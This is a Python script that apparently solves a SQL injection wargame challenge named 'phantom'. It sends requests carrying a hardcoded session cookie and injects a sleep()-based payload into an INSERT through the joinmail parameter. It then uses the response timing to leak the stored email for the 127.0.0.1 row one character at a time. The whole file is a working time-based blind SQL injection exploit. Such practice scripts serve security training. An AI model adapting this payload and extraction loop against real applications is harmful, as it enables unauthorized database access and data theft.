#!/usr/bin/env python3
# coding: utf-8

import requests
import time
import string

headers = {
    'Cookie': 'PHPSESSID=6b28r4o43epapipkuj2n3oposs',
}


def is_true(query):
    before = time.time()
    url = "https://los.rubiya.kr/chall/phantom_e2e30eaf1c0b3cb61b4b72a932c849fe.php?joinmail=a'),((select sleep(ip='127.0.0.1' and no=1 and {0}) from prob_phantom limit 1),'a','a".format(query)
    r = requests.get(url, headers=headers)
    after = time.time()
    if after - before >= 1:
        return True
    return False


def get_email_length():
    i = 1
    while True:
        query = 'length(email)={0}'.format(i)
        if is_true(query):
            return i
        i += 1


def get_char(location):
    for c in string.printable:
        query = 'mid(email,{0},1)=\"{1}\"'.format(location, c)
        if is_true(query):
            return c


def get_email():
    length = get_email_length()
    print('[*] length :', length)
    email = ''
    for i in range(1, length + 1):
        email += get_char(i)
        print('[*] leaked password :', email)
    return email


def main():
    print('[*] email :', get_email())


if __name__ == '__main__':
    main()

